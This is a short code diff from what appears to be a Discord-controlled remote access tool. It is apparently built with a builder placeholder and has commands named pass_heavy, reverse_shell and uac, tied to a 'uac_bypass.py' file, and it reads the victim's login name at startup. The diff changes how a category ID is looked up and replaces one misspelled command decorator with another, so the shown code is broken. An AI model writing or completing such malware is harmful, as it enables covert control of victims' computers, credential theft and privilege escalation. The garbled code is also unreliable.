@@ -74,9 +74,9 @@ async def on_ready():
     print(f"Logged in as {bot.user.name}")
 
     pc_username = os.getlogin()
-    category_id = "" #builder replace this:
 
-    category = bot.get_channel(category_id)
+    # Get the category using the global category_id
+    category = bot.get_channel(int(category_id))
     if not category:
         print(f"Error: Could not find category with ID {category_id}")
         return
@@ -600,7 +600,7 @@ async def pass_heavy(ctx,bot_k,cat_id):#done
 async def reverse_shell(ctx):#done
     filename="reverse_shell"
 
-@bot.comand()
+@bot.comnand()
 async def uac(ctx):
     filename="uac_bypass.py"
 
